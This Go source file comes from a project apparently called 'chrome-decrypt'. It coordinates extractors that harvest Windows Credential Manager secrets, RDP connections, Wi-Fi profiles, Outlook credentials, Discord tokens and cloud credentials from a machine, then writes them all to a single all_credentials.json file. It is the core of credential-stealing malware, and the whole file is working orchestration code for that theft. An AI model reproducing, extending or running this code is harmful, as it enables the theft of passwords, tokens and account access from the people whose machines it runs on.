package coordinate

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"

	"chrome-decrypt/pkg/credentials"
	"chrome-decrypt/pkg/credentials/cloud"
	"chrome-decrypt/pkg/credentials/credmanager"
	"chrome-decrypt/pkg/credentials/discord"
	"chrome-decrypt/pkg/credentials/outlook"
	"chrome-decrypt/pkg/credentials/rdp"
	"chrome-decrypt/pkg/credentials/wifi"
)

// Coordinator manages all credential extractors and saves to unified JSON
type Coordinator struct {
	verbose    bool
	outputPath string
	extractors []credentials.Extractor
}

// NewCoordinator creates a new credential extraction coordinator
func NewCoordinator(verbose bool, outputPath string) *Coordinator {
	coordinator := &Coordinator{
		verbose:    verbose,
		outputPath: outputPath,
	}

	// Initialize all extractors
	coordinator.extractors = []credentials.Extractor{
		credmanager.NewExtractor(verbose),
		rdp.NewExtractor(verbose),
		wifi.NewExtractor(verbose),
		outlook.NewExtractor(verbose),
		discord.NewExtractor(verbose),
		cloud.NewExtractor(verbose),
	}

	return coordinator
}

// ExtractAll extracts all credentials and saves to unified JSON
func (c *Coordinator) ExtractAll() error {
	if c.verbose {
		fmt.Println("[*] Starting comprehensive Windows credential extraction...")
	}

	// Create unified credentials structure
	unified := credentials.NewUnifiedCredentials()

	// Extract from each extractor
	for _, extractor := range c.extractors {
		extractorType := extractor.GetType()
		
		if c.verbose {
			fmt.Printf("[*] Running %s extractor...\n", extractorType)
		}

		result, err := extractor.Extract()
		if err != nil {
			if c.verbose {
				fmt.Printf("[-] Failed to extract %s: %v\n", extractorType, err)
			}
			continue
		}

		// Add results to unified structure based on type
		switch extractorType {
		case "credential_manager":
			if creds, ok := result.([]credentials.Credential); ok {
				unified.CredentialManager = creds
				unified.Metadata.TotalCount += len(creds)
			}
		case "rdp_connections":
			if creds, ok := result.([]credentials.RDPConnection); ok {
				unified.RDPConnections = creds
				unified.Metadata.TotalCount += len(creds)
			}
		case "wifi_profiles":
			if creds, ok := result.([]credentials.WiFiProfile); ok {
				unified.WiFiProfiles = creds
				unified.Metadata.TotalCount += len(creds)
			}
		case "outlook_credentials":
			if creds, ok := result.([]credentials.AppCredential); ok {
				unified.OutlookCredentials = creds
				unified.Metadata.TotalCount += len(creds)
			}
		case "discord_tokens":
			if creds, ok := result.([]credentials.AppCredential); ok {
				unified.DiscordTokens = creds
				unified.Metadata.TotalCount += len(creds)
			}
		case "cloud_credentials":
			if creds, ok := result.([]credentials.AppCredential); ok {
				unified.CloudCredentials = creds
				unified.Metadata.TotalCount += len(creds)
			}
		}

		if c.verbose {
			fmt.Printf("[+] %s extraction completed\n", extractorType)
		}
	}

	// Save unified credentials to single JSON file
	if err := c.saveUnifiedCredentials(unified); err != nil {
		return fmt.Errorf("failed to save unified credentials: %v", err)
	}

	if c.verbose {
		fmt.Printf("[+] All credential extraction completed! Total: %d credentials\n", unified.Metadata.TotalCount)
	}

	return nil
}

// saveUnifiedCredentials saves all credentials to a single structured JSON file
func (c *Coordinator) saveUnifiedCredentials(unified *credentials.UnifiedCredentials) error {
	if err := os.MkdirAll(c.outputPath, 0755); err != nil {
		return fmt.Errorf("failed to create output directory: %v", err)
	}

	outputFile := filepath.Join(c.outputPath, "all_credentials.json")

	data, err := json.MarshalIndent(unified, "", "  ")
	if err != nil {
		return fmt.Errorf("failed to marshal unified credentials: %v", err)
	}

	if err := os.WriteFile(outputFile, data, 0644); err != nil {
		return fmt.Errorf("failed to write unified credentials file: %v", err)
	}

	if c.verbose {
		fmt.Printf("[+] Saved %d total credentials to %s\n", unified.Metadata.TotalCount, outputFile)
	}

	return nil
}

// RunCredentialExtraction is the main entry point for credential extraction
func RunCredentialExtraction(verbose bool, outputPath string) error {
	coordinator := NewCoordinator(verbose, outputPath)
	return coordinator.ExtractAll()
}
